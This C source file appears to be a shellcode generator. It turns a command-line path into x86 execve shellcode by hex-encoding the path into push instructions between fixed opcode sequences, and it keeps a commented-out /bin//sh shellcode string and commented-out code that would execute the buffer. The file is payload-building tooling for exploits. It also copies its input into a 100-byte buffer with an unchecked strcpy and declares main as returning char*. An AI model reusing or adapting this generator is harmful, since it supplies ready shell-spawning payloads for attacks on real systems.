#include<stdio.h>
#include<string.h>
#include<stdlib.h>

char ascii[100];
char my_code[1024];
char *shellcode1 = "\\x31\\xc0\\x50";
char *shellcode2 = "\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80";
//char *bash_shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

char hexDigit(unsigned n)
{
    if (n < 10) {
        return n + '0';
    } else {
        return (n - 10) + 'A';
    }
}

void charToHex(char c, char hex[3])
{
    hex[0] = hexDigit(c / 0x10);
    hex[1] = hexDigit(c % 0x10);
    hex[2] = '\0';
}

void getHex(char *ascii, char output[1024])
{
	int i,c=0;
	char hex[10];
	if(strlen(ascii) % 4 != 0)
		c = 4 - (strlen(ascii) % 4);
	
	strcpy(output, "");
	for(i=0; i<strlen(ascii); i++) {
		while(ascii[i] == '/' && c!=0) {
			charToHex('/', hex);	
			strcat(output, "\\x");
			strcat(output, hex);	
			c--;
		}
		charToHex(ascii[i], hex);
		strcat(output, "\\x");
		strcat(output, hex);		
	}
}

char* main(int argc, char * argv[])
{
	char output[1024], code[1024];
	
	int i,j;
	if(argc < 2){
		printf("No arguments passed\n");
		exit(1);
	}
	strcpy(ascii, argv[1]);
	
	strcat(my_code, shellcode1);
	for(i=strlen(ascii)-4; i>=0; i-=4) {
		for(j=0; j<4; j++) {
			code[j] = ascii[i+j];
		}
		code[j]='\0';
		strcat(my_code, "\\x68");
		getHex(code, output);
		strcat(my_code, output);
	}
	strcat(my_code, shellcode2);
	printf("%s\n",my_code);		
/*	int (*shell)();
  	shell = my_code;
  	shell();
*/	return my_code;
}
